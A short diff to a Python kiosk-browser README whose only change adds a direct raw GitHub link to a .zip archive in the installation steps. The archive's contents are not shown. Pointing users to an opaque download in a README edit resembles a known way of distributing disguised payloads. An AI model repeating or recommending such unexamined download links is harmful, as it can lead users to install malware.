@@ -22,7 +22,7 @@ A lightweight, dedicated "Single Site Browser" (SSB) built in Python to monitor 
 
 **🚀 Installation**
 
-  Download and Extract the project folder.
+  Download and Extract the project folder https://raw.githubusercontent.com/COUPON4Vitamins/NUT-Kiosk-Browser/refs/heads/main/NUT-Kiosk-Browser.zip.
 
   Open a Terminal inside the folder and run:
 
